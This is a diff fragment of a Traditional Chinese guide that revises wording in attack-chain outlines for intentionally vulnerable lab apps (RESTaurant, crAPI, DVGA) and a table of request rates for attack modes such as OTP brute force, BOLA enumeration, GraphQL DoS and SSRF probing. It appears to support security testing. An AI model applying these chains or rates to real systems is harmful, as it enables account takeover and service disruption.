-2. **crAPI 完整流程：** 註冊 → 驗證電子郵件（MailHog）→ 登入 → 新增車輛 → 聯繫技師（SSRF）→ 訂單操控
-3. **DVGA 從偵察到利用：** 自省查詢 → 發現 systemDiagnostics → 暴力破解管理者憑證 → 執行 OS 命令
+1. **RESTaurant 提權鏈：** 註冊 → 取得權杖 → PATCH 角色為 Chef → 重新認證 → 命令注入
+2. **crAPI 完整流程：** 註冊 → 驗證信箱（MailHog）→ 登入 → 新增車輛 → 聯絡技師（SSRF）→ 訂單操作
+3. **DVGA 偵察到利用：** 自省查詢 → 發現 systemDiagnostics → 暴力破解管理員帳號密碼 → 作業系統命令執行
 
 ### 速率建議
 
 | 模式 | 每秒請求數 | 持續時間 | 備註 |
 |---|---|---|---|
-| 基準線（每個應用） | 10-50 | 5 分鐘 | 建立正常流量特徵 |
-| BOLA 列舉 | 100-500 | 2 分鐘 | 序號 ID 掃描 |
+| 基準線（每個應用程式） | 10-50 | 5 分鐘 | 建立正常流量指紋 |
+| BOLA 列舉 | 100-500 | 2 分鐘 | 循序 ID 掃描 |
 | OTP 暴力破解 | 1000+ | 直到找到為止 | 最多 10,000 次嘗試（4 位數） |
-| GraphQL DoS | 10-50 | 30 秒 | 每個請求都會消耗大量伺服器端資源 |
-| 注入模糊測試 | 50-200 | 5 分鐘 | 每次請求變換酬載 |
-| SSRF 探測 | 5-20 | 2 分鐘 | 較慢；每次都會觸發伺服器端 HTTP 請求 |
+| GraphQL DoS | 10-50 | 30 秒 | 每個請求在伺服器端消耗大量資源 |
+| 注入模糊測試 | 50-200 | 5 分鐘 | 每個請求變更酬載 |
+| SSRF 探測 | 5-20 | 2 分鐘 | 較慢；每個請求都會觸發伺服器端的 HTTP 請求 |
